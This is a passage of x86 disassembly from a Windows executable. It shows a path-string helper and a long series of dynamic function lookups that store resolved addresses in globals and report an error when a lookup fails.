  402c2a:	83 c4 10             	add    $0x10,%esp
  402c2d:	3d ff 0f 00 00       	cmp    $0xfff,%eax
  402c32:	73 6b                	jae    0x402c9f
  402c34:	80 7c 30 ff 5c       	cmpb   $0x5c,-0x1(%eax,%esi,1)
  402c39:	74 09                	je     0x402c44
  402c3b:	66 c7 04 30 5c 00    	movw   $0x5c,(%eax,%esi,1)
  402c41:	83 c0 02             	add    $0x2,%eax
  402c44:	8b 7c 24 14          	mov    0x14(%esp),%edi
  402c48:	ba 00 10 00 00       	mov    $0x1000,%edx
  402c4d:	8b cf                	mov    %edi,%ecx
  402c4f:	2b d0                	sub    %eax,%edx
  402c51:	53                   	push   %ebx
  402c52:	8d 59 01             	lea    0x1(%ecx),%ebx
  402c55:	8a 01                	mov    (%ecx),%al
  402c57:	41                   	inc    %ecx
  402c58:	84 c0                	test   %al,%al
  402c5a:	75 f9                	jne    0x402c55
  402c5c:	2b cb                	sub    %ebx,%ecx
  402c5e:	5b                   	pop    %ebx
  402c5f:	3b ca                	cmp    %edx,%ecx
  402c61:	73 3c                	jae    0x402c9f
  402c63:	80 7c 39 ff 5c       	cmpb   $0x5c,-0x1(%ecx,%edi,1)
  402c68:	52                   	push   %edx
  402c69:	57                   	push   %edi
  402c6a:	56                   	push   %esi
  402c6b:	75 25                	jne    0x402c92
  402c6d:	e8 0e fc 00 00       	call   0x412880
  402c72:	8b ce                	mov    %esi,%ecx
  402c74:	83 c4 0c             	add    $0xc,%esp
  402c77:	8d 51 01             	lea    0x1(%ecx),%edx
  402c7a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  402c80:	8a 01                	mov    (%ecx),%al
  402c82:	41                   	inc    %ecx
  402c83:	84 c0                	test   %al,%al
  402c85:	75 f9                	jne    0x402c80
  402c87:	2b ca                	sub    %edx,%ecx
  402c89:	5f                   	pop    %edi
  402c8a:	88 44 31 ff          	mov    %al,-0x1(%ecx,%esi,1)
  402c8e:	8b c6                	mov    %esi,%eax
  402c90:	5e                   	pop    %esi
  402c91:	c3                   	ret
  402c92:	e8 e9 fb 00 00       	call   0x412880
  402c97:	83 c4 0c             	add    $0xc,%esp
  402c9a:	8b c6                	mov    %esi,%eax
  402c9c:	5f                   	pop    %edi
  402c9d:	5e                   	pop    %esi
  402c9e:	c3                   	ret
  402c9f:	5f                   	pop    %edi
  402ca0:	33 c0                	xor    %eax,%eax
  402ca2:	5e                   	pop    %esi
  402ca3:	c3                   	ret
  402ca4:	cc                   	int3
  402ca5:	cc                   	int3
  402ca6:	cc                   	int3
  402ca7:	cc                   	int3
  402ca8:	cc                   	int3
  402ca9:	cc                   	int3
  402caa:	cc                   	int3
  402cab:	cc                   	int3
  402cac:	cc                   	int3
  402cad:	cc                   	int3
  402cae:	cc                   	int3
  402caf:	cc                   	int3
  402cb0:	56                   	push   %esi
  402cb1:	8b 74 24 08          	mov    0x8(%esp),%esi
  402cb5:	68 04 6a 42 00       	push   $0x426a04
  402cba:	56                   	push   %esi
  402cbb:	ff 15 6c 60 42 00    	call   *0x42606c
  402cc1:	a3 d8 4a 43 00       	mov    %eax,0x434ad8
  402cc6:	85 c0                	test   %eax,%eax
  402cc8:	75 17                	jne    0x402ce1
  402cca:	68 20 6a 42 00       	push   $0x426a20
  402ccf:	68 54 6a 42 00       	push   $0x426a54
  402cd4:	e8 a7 ee ff ff       	call   0x401b80
  402cd9:	83 c4 08             	add    $0x8,%esp
  402cdc:	83 c8 ff             	or     $0xffffffff,%eax
  402cdf:	5e                   	pop    %esi
  402ce0:	c3                   	ret
  402ce1:	68 64 6a 42 00       	push   $0x426a64
  402ce6:	56                   	push   %esi
  402ce7:	ff 15 6c 60 42 00    	call   *0x42606c
  402ced:	a3 cc 4a 43 00       	mov    %eax,0x434acc
  402cf2:	85 c0                	test   %eax,%eax
  402cf4:	75 17                	jne    0x402d0d
  402cf6:	68 84 6a 42 00       	push   $0x426a84
  402cfb:	68 54 6a 42 00       	push   $0x426a54
  402d00:	e8 7b ee ff ff       	call   0x401b80
  402d05:	83 c4 08             	add    $0x8,%esp
  402d08:	83 c8 ff             	or     $0xffffffff,%eax
  402d0b:	5e                   	pop    %esi
  402d0c:	c3                   	ret
  402d0d:	68 bc 6a 42 00       	push   $0x426abc
  402d12:	56                   	push   %esi
  402d13:	ff 15 6c 60 42 00    	call   *0x42606c
  402d19:	a3 c0 4a 43 00       	mov    %eax,0x434ac0
  402d1e:	85 c0                	test   %eax,%eax
  402d20:	75 17                	jne    0x402d39
  402d22:	68 cc 6a 42 00       	push   $0x426acc
  402d27:	68 54 6a 42 00       	push   $0x426a54
  402d2c:	e8 4f ee ff ff       	call   0x401b80
  402d31:	83 c4 08             	add    $0x8,%esp
  402d34:	83 c8 ff             	or     $0xffffffff,%eax
  402d37:	5e                   	pop    %esi
  402d38:	c3                   	ret
  402d39:	68 f8 6a 42 00       	push   $0x426af8
  402d3e:	56                   	push   %esi
  402d3f:	ff 15 6c 60 42 00    	call   *0x42606c
  402d45:	a3 d4 4a 43 00       	mov    %eax,0x434ad4
  402d4a:	85 c0                	test   %eax,%eax
  402d4c:	75 17                	jne    0x402d65
  402d4e:	68 14 6b 42 00       	push   $0x426b14
  402d53:	68 54 6a 42 00       	push   $0x426a54
  402d58:	e8 23 ee ff ff       	call   0x401b80
  402d5d:	83 c4 08             	add    $0x8,%esp
  402d60:	83 c8 ff             	or     $0xffffffff,%eax
  402d63:	5e                   	pop    %esi
  402d64:	c3                   	ret
  402d65:	68 48 6b 42 00       	push   $0x426b48
  402d6a:	56                   	push   %esi
  402d6b:	ff 15 6c 60 42 00    	call   *0x42606c
  402d71:	a3 c4 4a 43 00       	mov    %eax,0x434ac4
  402d76:	85 c0                	test   %eax,%eax
  402d78:	75 17                	jne    0x402d91
  402d7a:	68 58 6b 42 00       	push   $0x426b58
  402d7f:	68 54 6a 42 00       	push   $0x426a54
  402d84:	e8 f7 ed ff ff       	call   0x401b80
  402d89:	83 c4 08             	add    $0x8,%esp
  402d8c:	83 c8 ff             	or     $0xffffffff,%eax
  402d8f:	5e                   	pop    %esi
  402d90:	c3                   	ret
  402d91:	68 84 6b 42 00       	push   $0x426b84
  402d96:	56                   	push   %esi
  402d97:	ff 15 6c 60 42 00    	call   *0x42606c
  402d9d:	a3 dc 4a 43 00       	mov    %eax,0x434adc
  402da2:	85 c0                	test   %eax,%eax
  402da4:	75 17                	jne    0x402dbd
  402da6:	68 9c 6b 42 00       	push   $0x426b9c
  402dab:	68 54 6a 42 00       	push   $0x426a54
  402db0:	e8 cb ed ff ff       	call   0x401b80
  402db5:	83 c4 08             	add    $0x8,%esp
  402db8:	83 c8 ff             	or     $0xffffffff,%eax
  402dbb:	5e                   	pop    %esi
  402dbc:	c3                   	ret
  402dbd:	68 d0 6b 42 00       	push   $0x426bd0
  402dc2:	56                   	push   %esi
  402dc3:	ff 15 6c 60 42 00    	call   *0x42606c
  402dc9:	a3 c8 4a 43 00       	mov    %eax,0x434ac8
  402dce:	85 c0                	test   %eax,%eax
  402dd0:	75 17                	jne    0x402de9
  402dd2:	68 e0 6b 42 00       	push   $0x426be0
  402dd7:	68 54 6a 42 00       	push   $0x426a54
  402ddc:	e8 9f ed ff ff       	call   0x401b80
  402de1:	83 c4 08             	add    $0x8,%esp
  402de4:	83 c8 ff             	or     $0xffffffff,%eax
  402de7:	5e                   	pop    %esi
  402de8:	c3                   	ret
  402de9:	68 0c 6c 42 00       	push   $0x426c0c
  402dee:	56                   	push   %esi
  402def:	ff 15 6c 60 42 00    	call   *0x42606c
  402df5:	a3 d0 4a 43 00       	mov    %eax,0x434ad0
  402dfa:	85 c0                	test   %eax,%eax
  402dfc:	75 17                	jne    0x402e15
  402dfe:	68 1c 6c 42 00       	push   $0x426c1c
  402e03:	68 54 6a 42 00       	push   $0x426a54
  402e08:	e8 73 ed ff ff       	call   0x401b80
  402e0d:	83 c4 08             	add    $0x8,%esp
  402e10:	83 c8 ff             	or     $0xffffffff,%eax
  402e13:	5e                   	pop    %esi
  402e14:	c3                   	ret
  402e15:	68 48 6c 42 00       	push   $0x426c48
  402e1a:	56                   	push   %esi
  402e1b:	ff 15 6c 60 42 00    	call   *0x42606c
  402e21:	a3 e0 4a 43 00       	mov    %eax,0x434ae0
  402e26:	85 c0                	test   %eax,%eax
  402e28:	75 17                	jne    0x402e41
  402e2a:	68 60 6c 42 00       	push   $0x426c60
  402e2f:	68 54 6a 42 00       	push   $0x426a54
  402e34:	e8 47 ed ff ff       	call   0x401b80
  402e39:	83 c4 08             	add    $0x8,%esp
  402e3c:	83 c8 ff             	or     $0xffffffff,%eax
  402e3f:	5e                   	pop    %esi
  402e40:	c3                   	ret
  402e41:	81 7c 24 0c 33 01 00 	cmpl   $0x133,0xc(%esp)
  402e48:	00 
  402e49:	7c 2c                	jl     0x402e77
  402e4b:	68 94 6c 42 00       	push   $0x426c94
  402e50:	56                   	push   %esi
  402e51:	ff 15 6c 60 42 00    	call   *0x42606c
  402e57:	a3 e4 4a 43 00       	mov    %eax,0x434ae4
  402e5c:	85 c0                	test   %eax,%eax
  402e5e:	75 17                	jne    0x402e77
  402e60:	68 a0 6c 42 00       	push   $0x426ca0
  402e65:	68 54 6a 42 00       	push   $0x426a54
  402e6a:	e8 11 ed ff ff       	call   0x401b80
  402e6f:	83 c4 08             	add    $0x8,%esp
  402e72:	83 c8 ff             	or     $0xffffffff,%eax
  402e75:	5e                   	pop    %esi
  402e76:	c3                   	ret
  402e77:	68 c8 6c 42 00       	push   $0x426cc8
  402e7c:	56                   	push   %esi
  402e7d:	ff 15 6c 60 42 00    	call   *0x42606c
  402e83:	a3 2c 4b 43 00       	mov    %eax,0x434b2c
  402e88:	85 c0                	test   %eax,%eax
  402e8a:	75 17                	jne    0x402ea3
  402e8c:	68 d8 6c 42 00       	push   $0x426cd8
  402e91:	68 54 6a 42 00       	push   $0x426a54
  402e96:	e8 e5 ec ff ff       	call   0x401b80
  402e9b:	83 c4 08             	add    $0x8,%esp
  402e9e:	83 c8 ff             	or     $0xffffffff,%eax
  402ea1:	5e                   	pop    %esi
  402ea2:	c3                   	ret
  402ea3:	68 04 6d 42 00       	push   $0x426d04
  402ea8:	56                   	push   %esi
  402ea9:	ff 15 6c 60 42 00    	call   *0x42606c
  402eaf:	a3 f4 4a 43 00       	mov    %eax,0x434af4
  402eb4:	85 c0                	test   %eax,%eax
  402eb6:	75 17                	jne    0x402ecf
  402eb8:	68 10 6d 42 00       	push   $0x426d10
  402ebd:	68 54 6a 42 00       	push   $0x426a54
  402ec2:	e8 b9 ec ff ff       	call   0x401b80
  402ec7:	83 c4 08             	add    $0x8,%esp
  402eca:	83 c8 ff             	or     $0xffffffff,%eax
  402ecd:	5e                   	pop    %esi
  402ece:	c3                   	ret
  402ecf:	68 38 6d 42 00       	push   $0x426d38
  402ed4:	56                   	push   %esi
  402ed5:	ff 15 6c 60 42 00    	call   *0x42606c
  402edb:	a3 ec 4a 43 00       	mov    %eax,0x434aec
  402ee0:	85 c0                	test   %eax,%eax
  402ee2:	75 17                	jne    0x402efb
  402ee4:	68 44 6d 42 00       	push   $0x426d44
  402ee9:	68 54 6a 42 00       	push   $0x426a54
  402eee:	e8 8d ec ff ff       	call   0x401b80
  402ef3:	83 c4 08             	add    $0x8,%esp
  402ef6:	83 c8 ff             	or     $0xffffffff,%eax
  402ef9:	5e                   	pop    %esi
  402efa:	c3                   	ret
  402efb:	68 6c 6d 42 00       	push   $0x426d6c
  402f00:	56                   	push   %esi
  402f01:	ff 15 6c 60 42 00    	call   *0x42606c
  402f07:	a3 f0 4a 43 00       	mov    %eax,0x434af0
  402f0c:	85 c0                	test   %eax,%eax
  402f0e:	75 17                	jne    0x402f27
  402f10:	68 78 6d 42 00       	push   $0x426d78
  402f15:	68 54 6a 42 00       	push   $0x426a54
  402f1a:	e8 61 ec ff ff       	call   0x401b80
  402f1f:	83 c4 08             	add    $0x8,%esp
  402f22:	83 c8 ff             	or     $0xffffffff,%eax
  402f25:	5e                   	pop    %esi
  402f26:	c3                   	ret
  402f27:	68 a0 6d 42 00       	push   $0x426da0
  402f2c:	56                   	push   %esi
  402f2d:	ff 15 6c 60 42 00    	call   *0x42606c
  402f33:	a3 e8 4a 43 00       	mov    %eax,0x434ae8
  402f38:	85 c0                	test   %eax,%eax
  402f3a:	75 17                	jne    0x402f53
  402f3c:	68 b0 6d 42 00       	push   $0x426db0
  402f41:	68 54 6a 42 00       	push   $0x426a54
  402f46:	e8 35 ec ff ff       	call   0x401b80
  402f4b:	83 c4 08             	add    $0x8,%esp
  402f4e:	83 c8 ff             	or     $0xffffffff,%eax
  402f51:	5e                   	pop    %esi
  402f52:	c3                   	ret
  402f53:	68 dc 6d 42 00       	push   $0x426ddc
  402f58:	56                   	push   %esi
  402f59:	ff 15 6c 60 42 00    	call   *0x42606c
  402f5f:	a3 00 4b 43 00       	mov    %eax,0x434b00
  402f64:	85 c0                	test   %eax,%eax
  402f66:	75 17                	jne    0x402f7f
  402f68:	68 e8 6d 42 00       	push   $0x426de8
  402f6d:	68 54 6a 42 00       	push   $0x426a54
  402f72:	e8 09 ec ff ff       	call   0x401b80
  402f77:	83 c4 08             	add    $0x8,%esp
  402f7a:	83 c8 ff             	or     $0xffffffff,%eax
  402f7d:	5e                   	pop    %esi
  402f7e:	c3                   	ret
  402f7f:	68 10 6e 42 00       	push   $0x426e10
  402f84:	56                   	push   %esi
  402f85:	ff 15 6c 60 42 00    	call   *0x42606c
  402f8b:	a3 04 4b 43 00       	mov    %eax,0x434b04
  402f90:	85 c0                	test   %eax,%eax
  402f92:	75 17                	jne    0x402fab
  402f94:	68 1c 6e 42 00       	push   $0x426e1c
  402f99:	68 54 6a 42 00       	push   $0x426a54
  402f9e:	e8 dd eb ff ff       	call   0x401b80
  402fa3:	83 c4 08             	add    $0x8,%esp
  402fa6:	83 c8 ff             	or     $0xffffffff,%eax
  402fa9:	5e                   	pop    %esi
  402faa:	c3                   	ret
  402fab:	68 44 6e 42 00       	push   $0x426e44
  402fb0:	56                   	push   %esi
  402fb1:	ff 15 6c 60 42 00    	call   *0x42606c
  402fb7:	a3 f8 4a 43 00       	mov    %eax,0x434af8
  402fbc:	85 c0                	test   %eax,%eax
  402fbe:	75 17                	jne    0x402fd7
  402fc0:	68 58 6e 42 00       	push   $0x426e58
  402fc5:	68 54 6a 42 00       	push   $0x426a54
  402fca:	e8 b1 eb ff ff       	call   0x401b80
  402fcf:	83 c4 08             	add    $0x8,%esp
  402fd2:	83 c8 ff             	or     $0xffffffff,%eax
  402fd5:	5e                   	pop    %esi
  402fd6:	c3                   	ret
  402fd7:	68 88 6e 42 00       	push   $0x426e88
  402fdc:	56                   	push   %esi
  402fdd:	ff 15 6c 60 42 00    	call   *0x42606c
  402fe3:	a3 fc 4a 43 00       	mov    %eax,0x434afc
  402fe8:	85 c0                	test   %eax,%eax
  402fea:	75 17                	jne    0x403003
  402fec:	68 9c 6e 42 00       	push   $0x426e9c
  402ff1:	68 54 6a 42 00       	push   $0x426a54
  402ff6:	e8 85 eb ff ff       	call   0x401b80
  402ffb:	83 c4 08             	add    $0x8,%esp
  402ffe:	83 c8 ff             	or     $0xffffffff,%eax
  403001:	5e                   	pop    %esi
  403002:	c3                   	ret
  403003:	68 c8 6e 42 00       	push   $0x426ec8
  403008:	56                   	push   %esi
  403009:	ff 15 6c 60 42 00    	call   *0x42606c
  40300f:	a3 40 4b 43 00       	mov    %eax,0x434b40
  403014:	85 c0                	test   %eax,%eax
  403016:	75 17                	jne    0x40302f
  403018:	68 e0 6e 42 00       	push   $0x426ee0
  40301d:	68 54 6a 42 00       	push   $0x426a54
  403022:	e8 59 eb ff ff       	call   0x401b80
  403027:	83 c4 08             	add    $0x8,%esp
  40302a:	83 c8 ff             	or     $0xffffffff,%eax
  40302d:	5e                   	pop    %esi
  40302e:	c3                   	ret
  40302f:	68 10 6f 42 00       	push   $0x426f10
  403034:	56                   	push   %esi
  403035:	ff 15 6c 60 42 00    	call   *0x42606c
  40303b:	a3 44 4b 43 00       	mov    %eax,0x434b44
  403040:	85 c0                	test   %eax,%eax
  403042:	75 17                	jne    0x40305b
  403044:	68 1c 6f 42 00       	push   $0x426f1c
  403049:	68 54 6a 42 00       	push   $0x426a54
  40304e:	e8 2d eb ff ff       	call   0x401b80
  403053:	83 c4 08             	add    $0x8,%esp
  403056:	83 c8 ff             	or     $0xffffffff,%eax
  403059:	5e                   	pop    %esi
  40305a:	c3                   	ret
  40305b:	68 44 6f 42 00       	push   $0x426f44
  403060:	56                   	push   %esi
  403061:	ff 15 6c 60 42 00    	call   *0x42606c
  403067:	a3 48 4b 43 00       	mov    %eax,0x434b48
  40306c:	85 c0                	test   %eax,%eax
  40306e:	75 17                	jne    0x403087
  403070:	68 54 6f 42 00       	push   $0x426f54
  403075:	68 54 6a 42 00       	push   $0x426a54
  40307a:	e8 01 eb ff ff       	call   0x401b80
  40307f:	83 c4 08             	add    $0x8,%esp
  403082:	83 c8 ff             	or     $0xffffffff,%eax
  403085:	5e                   	pop    %esi
  403086:	c3                   	ret
  403087:	68 80 6f 42 00       	push   $0x426f80
  40308c:	56                   	push   %esi
  40308d:	ff 15 6c 60 42 00    	call   *0x42606c
  403093:	a3 4c 4b 43 00       	mov    %eax,0x434b4c
  403098:	85 c0                	test   %eax,%eax
  40309a:	75 17                	jne    0x4030b3
  40309c:	68 8c 6f 42 00       	push   $0x426f8c
  4030a1:	68 54 6a 42 00       	push   $0x426a54
  4030a6:	e8 d5 ea ff ff       	call   0x401b80
  4030ab:	83 c4 08             	add    $0x8,%esp
  4030ae:	83 c8 ff             	or     $0xffffffff,%eax
  4030b1:	5e                   	pop    %esi
  4030b2:	c3                   	ret
  4030b3:	68 b4 6f 42 00       	push   $0x426fb4
  4030b8:	56                   	push   %esi
  4030b9:	ff 15 6c 60 42 00    	call   *0x42606c
  4030bf:	a3 7c 4b 43 00       	mov    %eax,0x434b7c
  4030c4:	85 c0                	test   %eax,%eax
  4030c6:	75 17                	jne    0x4030df
  4030c8:	68 c0 6f 42 00       	push   $0x426fc0
  4030cd:	68 54 6a 42 00       	push   $0x426a54
  4030d2:	e8 a9 ea ff ff       	call   0x401b80
  4030d7:	83 c4 08             	add    $0x8,%esp
  4030da:	83 c8 ff             	or     $0xffffffff,%eax
  4030dd:	5e                   	pop    %esi
  4030de:	c3                   	ret
  4030df:	68 e8 6f 42 00       	push   $0x426fe8
  4030e4:	56                   	push   %esi
  4030e5:	ff 15 6c 60 42 00    	call   *0x42606c
  4030eb:	a3 80 4b 43 00       	mov    %eax,0x434b80
  4030f0:	85 c0                	test   %eax,%eax
  4030f2:	75 17                	jne    0x40310b
  4030f4:	68 f8 6f 42 00       	push   $0x426ff8
  4030f9:	68 54 6a 42 00       	push   $0x426a54
  4030fe:	e8 7d ea ff ff       	call   0x401b80
  403103:	83 c4 08             	add    $0x8,%esp
  403106:	83 c8 ff             	or     $0xffffffff,%eax
  403109:	5e                   	pop    %esi
  40310a:	c3                   	ret
  40310b:	68 24 70 42 00       	push   $0x427024
  403110:	56                   	push   %esi
  403111:	ff 15 6c 60 42 00    	call   *0x42606c
  403117:	a3 84 4b 43 00       	mov    %eax,0x434b84
  40311c:	85 c0                	test   %eax,%eax
  40311e:	75 17                	jne    0x403137
  403120:	68 40 70 42 00       	push   $0x427040
  403125:	68 54 6a 42 00       	push   $0x426a54
  40312a:	e8 51 ea ff ff       	call   0x401b80
  40312f:	83 c4 08             	add    $0x8,%esp
  403132:	83 c8 ff             	or     $0xffffffff,%eax
  403135:	5e                   	pop    %esi
  403136:	c3                   	ret
  403137:	68 74 70 42 00       	push   $0x427074
  40313c:	56                   	push   %esi
  40313d:	ff 15 6c 60 42 00    	call   *0x42606c
  403143:	a3 1c 4b 43 00       	mov    %eax,0x434b1c
  403148:	85 c0                	test   %eax,%eax
  40314a:	75 17                	jne    0x403163
  40314c:	68 88 70 42 00       	push   $0x427088
  403151:	68 54 6a 42 00       	push   $0x426a54
  403156:	e8 25 ea ff ff       	call   0x401b80
  40315b:	83 c4 08             	add    $0x8,%esp
  40315e:	83 c8 ff             	or     $0xffffffff,%eax
  403161:	5e                   	pop    %esi
  403162:	c3                   	ret
  403163:	68 b8 70 42 00       	push   $0x4270b8
  403168:	56                   	push   %esi
  403169:	ff 15 6c 60 42 00    	call   *0x42606c
  40316f:	a3 14 4b 43 00       	mov    %eax,0x434b14
  403174:	85 c0                	test   %eax,%eax
  403176:	75 17                	jne    0x40318f
  403178:	68 d0 70 42 00       	push   $0x4270d0
  40317d:	68 54 6a 42 00       	push   $0x426a54
  403182:	e8 f9 e9 ff ff       	call   0x401b80
  403187:	83 c4 08             	add    $0x8,%esp
  40318a:	83 c8 ff             	or     $0xffffffff,%eax
  40318d:	5e                   	pop    %esi
  40318e:	c3                   	ret
  40318f:	68 04 71 42 00       	push   $0x427104
  403194:	56                   	push   %esi
  403195:	ff 15 6c 60 42 00    	call   *0x42606c
  40319b:	a3 18 4b 43 00       	mov    %eax,0x434b18
  4031a0:	85 c0                	test   %eax,%eax
  4031a2:	75 17                	jne    0x4031bb
  4031a4:	68 1c 71 42 00       	push   $0x42711c
  4031a9:	68 54 6a 42 00       	push   $0x426a54
  4031ae:	e8 cd e9 ff ff       	call   0x401b80
  4031b3:	83 c4 08             	add    $0x8,%esp
  4031b6:	83 c8 ff             	or     $0xffffffff,%eax
  4031b9:	5e                   	pop    %esi
  4031ba:	c3                   	ret
  4031bb:	68 50 71 42 00       	push   $0x427150
  4031c0:	56                   	push   %esi
  4031c1:	ff 15 6c 60 42 00    	call   *0x42606c
  4031c7:	a3 28 4b 43 00       	mov    %eax,0x434b28
  4031cc:	85 c0                	test   %eax,%eax
  4031ce:	75 17                	jne    0x4031e7
  4031d0:	68 60 71 42 00       	push   $0x427160
  4031d5:	68 54 6a 42 00       	push   $0x426a54
  4031da:	e8 a1 e9 ff ff       	call   0x401b80
  4031df:	83 c4 08             	add    $0x8,%esp
  4031e2:	83 c8 ff             	or     $0xffffffff,%eax
  4031e5:	5e                   	pop    %esi
  4031e6:	c3                   	ret
  4031e7:	68 8c 71 42 00       	push   $0x42718c
  4031ec:	56                   	push   %esi
  4031ed:	ff 15 6c 60 42 00    	call   *0x42606c
  4031f3:	a3 24 4b 43 00       	mov    %eax,0x434b24
  4031f8:	85 c0                	test   %eax,%eax
  4031fa:	75 17                	jne    0x403213
  4031fc:	68 98 71 42 00       	push   $0x427198
  403201:	68 54 6a 42 00       	push   $0x426a54
  403206:	e8 75 e9 ff ff       	call   0x401b80
  40320b:	83 c4 08             	add    $0x8,%esp
  40320e:	83 c8 ff             	or     $0xffffffff,%eax
  403211:	5e                   	pop    %esi
  403212:	c3                   	ret
  403213:	68 c0 71 42 00       	push   $0x4271c0
  403218:	56                   	push   %esi
  403219:	ff 15 6c 60 42 00    	call   *0x42606c
  40321f:	a3 54 4b 43 00       	mov    %eax,0x434b54
  403224:	85 c0                	test   %eax,%eax
  403226:	75 17                	jne    0x40323f
  403228:	68 d0 71 42 00       	push   $0x4271d0
  40322d:	68 54 6a 42 00       	push   $0x426a54
  403232:	e8 49 e9 ff ff       	call   0x401b80
  403237:	83 c4 08             	add    $0x8,%esp
  40323a:	83 c8 ff             	or     $0xffffffff,%eax
  40323d:	5e                   	pop    %esi
  40323e:	c3                   	ret
  40323f:	68 fc 71 42 00       	push   $0x4271fc
  403244:	56                   	push   %esi
  403245:	ff 15 6c 60 42 00    	call   *0x42606c
  40324b:	a3 3c 4b 43 00       	mov    %eax,0x434b3c
  403250:	85 c0                	test   %eax,%eax
  403252:	75 17                	jne    0x40326b
  403254:	68 10 72 42 00       	push   $0x427210
  403259:	68 54 6a 42 00       	push   $0x426a54
  40325e:	e8 1d e9 ff ff       	call   0x401b80
  403263:	83 c4 08             	add    $0x8,%esp
  403266:	83 c8 ff             	or     $0xffffffff,%eax
  403269:	5e                   	pop    %esi
  40326a:	c3                   	ret
  40326b:	68 3c 72 42 00       	push   $0x42723c
  403270:	56                   	push   %esi
  403271:	ff 15 6c 60 42 00    	call   *0x42606c
  403277:	a3 34 4b 43 00       	mov    %eax,0x434b34
  40327c:	85 c0                	test   %eax,%eax
  40327e:	75 17                	jne    0x403297
  403280:	68 54 72 42 00       	push   $0x427254
  403285:	68 54 6a 42 00       	push   $0x426a54
  40328a:	e8 f1 e8 ff ff       	call   0x401b80
  40328f:	83 c4 08             	add    $0x8,%esp
  403292:	83 c8 ff             	or     $0xffffffff,%eax
  403295:	5e                   	pop    %esi
  403296:	c3                   	ret
  403297:	68 88 72 42 00       	push   $0x427288
  40329c:	56                   	push   %esi
  40329d:	ff 15 6c 60 42 00    	call   *0x42606c
  4032a3:	a3 38 4b 43 00       	mov    %eax,0x434b38
  4032a8:	85 c0                	test   %eax,%eax
  4032aa:	75 17                	jne    0x4032c3
  4032ac:	68 a8 72 42 00       	push   $0x4272a8
  4032b1:	68 54 6a 42 00       	push   $0x426a54
  4032b6:	e8 c5 e8 ff ff       	call   0x401b80
  4032bb:	83 c4 08             	add    $0x8,%esp
  4032be:	83 c8 ff             	or     $0xffffffff,%eax
  4032c1:	5e                   	pop    %esi
  4032c2:	c3                   	ret
  4032c3:	68 e0 72 42 00       	push   $0x4272e0
  4032c8:	56                   	push   %esi
  4032c9:	ff 15 6c 60 42 00    	call   *0x42606c
  4032cf:	a3 20 4b 43 00       	mov    %eax,0x434b20
  4032d4:	85 c0                	test   %eax,%eax
  4032d6:	75 17                	jne    0x4032ef
  4032d8:	68 f8 72 42 00       	push   $0x4272f8
  4032dd:	68 54 6a 42 00       	push   $0x426a54
  4032e2:	e8 99 e8 ff ff       	call   0x401b80
  4032e7:	83 c4 08             	add    $0x8,%esp
  4032ea:	83 c8 ff             	or     $0xffffffff,%eax
  4032ed:	5e                   	pop    %esi
  4032ee:	c3                   	ret
  4032ef:	68 2c 73 42 00       	push   $0x42732c
  4032f4:	56                   	push   %esi
  4032f5:	ff 15 6c 60 42 00    	call   *0x42606c
  4032fb:	a3 8c 4b 43 00       	mov    %eax,0x434b8c
  403300:	85 c0                	test   %eax,%eax
  403302:	75 17                	jne    0x40331b
  403304:	68 44 73 42 00       	push   $0x427344
  403309:	68 54 6a 42 00       	push   $0x426a54
  40330e:	e8 6d e8 ff ff       	call   0x401b80
  403313:	83 c4 08             	add    $0x8,%esp
  403316:	83 c8 ff             	or     $0xffffffff,%eax
  403319:	5e                   	pop    %esi
  40331a:	c3                   	ret
  40331b:	68 78 73 42 00       	push   $0x427378
  403320:	56                   	push   %esi
  403321:	ff 15 6c 60 42 00    	call   *0x42606c
  403327:	a3 88 4b 43 00       	mov    %eax,0x434b88
  40332c:	85 c0                	test   %eax,%eax
  40332e:	75 17                	jne    0x403347
  403330:	68 88 73 42 00       	push   $0x427388
  403335:	68 54 6a 42 00       	push   $0x426a54
  40333a:	e8 41 e8 ff ff       	call   0x401b80
  40333f:	83 c4 08             	add    $0x8,%esp
  403342:	83 c8 ff             	or     $0xffffffff,%eax
  403345:	5e                   	pop    %esi
  403346:	c3                   	ret
  403347:	68 b0 73 42 00       	push   $0x4273b0
  40334c:	56                   	push   %esi
  40334d:	ff 15 6c 60 42 00    	call   *0x42606c
  403353:	a3 10 4b 43 00       	mov    %eax,0x434b10
  403358:	85 c0                	test   %eax,%eax
  40335a:	75 17                	jne    0x403373
  40335c:	68 c8 73 42 00       	push   $0x4273c8
  403361:	68 54 6a 42 00       	push   $0x426a54
  403366:	e8 15 e8 ff ff       	call   0x401b80
  40336b:	83 c4 08             	add    $0x8,%esp
  40336e:	83 c8 ff             	or     $0xffffffff,%eax
  403371:	5e                   	pop    %esi
  403372:	c3                   	ret
  403373:	68 fc 73 42 00       	push   $0x4273fc
  403378:	56                   	push   %esi
  403379:	ff 15 6c 60 42 00    	call   *0x42606c
  40337f:	a3 50 4b 43 00       	mov    %eax,0x434b50
  403384:	85 c0                	test   %eax,%eax
  403386:	75 17                	jne    0x40339f
  403388:	68 10 74 42 00       	push   $0x427410
  40338d:	68 54 6a 42 00       	push   $0x426a54
  403392:	e8 e9 e7 ff ff       	call   0x401b80
  403397:	83 c4 08             	add    $0x8,%esp
  40339a:	83 c8 ff             	or     $0xffffffff,%eax
  40339d:	5e                   	pop    %esi
  40339e:	c3                   	ret
  40339f:	68 40 74 42 00       	push   $0x427440
  4033a4:	56                   	push   %esi
  4033a5:	ff 15 6c 60 42 00    	call   *0x42606c
  4033ab:	a3 0c 4b 43 00       	mov    %eax,0x434b0c
  4033b0:	85 c0                	test   %eax,%eax
  4033b2:	75 17                	jne    0x4033cb
  4033b4:	68 50 74 42 00       	push   $0x427450
  4033b9:	68 54 6a 42 00       	push   $0x426a54
  4033be:	e8 bd e7 ff ff       	call   0x401b80
  4033c3:	83 c4 08             	add    $0x8,%esp
  4033c6:	83 c8 ff             	or     $0xffffffff,%eax
  4033c9:	5e                   	pop    %esi
  4033ca:	c3                   	ret
  4033cb:	68 7c 74 42 00       	push   $0x42747c
  4033d0:	56                   	push   %esi
  4033d1:	ff 15 6c 60 42 00    	call   *0x42606c
  4033d7:	a3 64 4b 43 00       	mov    %eax,0x434b64
  4033dc:	85 c0                	test   %eax,%eax
  4033de:	75 17                	jne    0x4033f7
  4033e0:	68 8c 74 42 00       	push   $0x42748c
  4033e5:	68 54 6a 42 00       	push   $0x426a54
  4033ea:	e8 91 e7 ff ff       	call   0x401b80
  4033ef:	83 c4 08             	add    $0x8,%esp
  4033f2:	83 c8 ff             	or     $0xffffffff,%eax
  4033f5:	5e                   	pop    %esi
  4033f6:	c3                   	ret
  4033f7:	68 b8 74 42 00       	push   $0x4274b8
  4033fc:	56                   	push   %esi
